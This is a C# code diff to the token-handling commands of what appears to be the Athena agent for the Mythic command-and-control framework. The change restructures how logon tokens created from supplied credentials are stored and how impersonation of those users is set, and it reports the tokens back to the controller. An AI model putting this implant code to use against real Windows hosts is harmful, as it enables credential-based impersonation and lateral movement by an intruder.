@@ -19,7 +19,8 @@ namespace Athena.Commands
 {
     public class TokenHandler
     {
-        static Dictionary<string, SafeAccessTokenHandle> tokens = new Dictionary<string, SafeAccessTokenHandle>();
+        //static Dictionary<string, SafeAccessTokenHandle> tokens = new Dictionary<string, SafeAccessTokenHandle>();
+        static Dictionary<string, Token> tokens = new Dictionary<string, Token>();
         static string impersonatedUser = "";
 
         public async Task<object> CreateToken(MythicJob job)
@@ -37,14 +38,40 @@ namespace Athena.Commands
                     out hToken
                     ))
                 {
-                    tokens.Add(tokenOptions.name, hToken);
+                    Token token = new Token()
+                    {
+                        Handle = hToken,
+                        description  = tokenOptions.username,
+                        TokenID = tokens.Count + 1
+                    };
+                    
+                    if (tokenOptions.username.Contains("@"))
+                    {
+                        string[] split = tokenOptions.username.Split('@');
+                        token.user = $"{split[1]}\\{split[0]}";
+                    }
+                    else
+                    {
+                        token.user = $"{tokenOptions.domain}\\{tokenOptions.username}";
+                    }
 
-                    return new ResponseResult()
+
+                    tokens.Add(tokenOptions.name, token);
+                    //tokens.Add(tokenOptions.name, hToken);
+
+                    return new TokenResponseResult()
                     {
                         user_output = $"Token created for {tokenOptions.username}",
-                        status = "success",
                         completed = "true",
                         task_id = job.task.id,
+                        //tokens = new List<Token>() { token },
+                        callback_tokens = new List<CallbackToken> { new CallbackToken()
+                        {
+                            action = "add",
+                            host = System.Net.Dns.GetHostName(),
+                            TokenID = token.TokenID,
+                        } }
+                        
                     };
                 }
                 else
@@ -52,7 +79,6 @@ namespace Athena.Commands
                     return new ResponseResult()
                     {
                         user_output = $"Failed to create token: {Marshal.GetLastWin32Error()}",
-                        status = "success",
                         completed = "true",
                         task_id = job.task.id,
                     };
@@ -74,7 +100,7 @@ namespace Athena.Commands
         {
             if (!String.IsNullOrEmpty(impersonatedUser))
             {
-                return Pinvoke.ImpersonateLoggedOnUser(tokens[impersonatedUser]);
+                return Pinvoke.ImpersonateLoggedOnUser(tokens[impersonatedUser].Handle);
             }
             return true; //No impesronation to do so just return
         }
@@ -84,12 +110,14 @@ namespace Athena.Commands
         }
         public async Task<object> SetToken(MythicJob job)
         {
-            if (tokens.ContainsKey(job.task.parameters))
+            var tokenInfo = JsonConvert.DeserializeObject<Dictionary<string, object>>(job.task.parameters);
+            string user = tokenInfo["name"].ToString();
+            if (tokens.ContainsKey(user))
             {
-                impersonatedUser = job.task.parameters;
+                impersonatedUser = user;
                 return new ResponseResult()
                 {
-                    user_output = $"Token set to {job.task.parameters}",
+                    user_output = $"Token set to {user}",
                     status = "success",
                     completed = "true",
                     task_id = job.task.id,
@@ -98,7 +126,7 @@ namespace Athena.Commands
 
             return new ResponseResult()
             {
-                user_output = $"No token with name: {job.task.parameters}",
+                user_output = $"No token with name: {user}",
                 status = "errored",
                 completed = "true",
                 task_id = job.task.id,
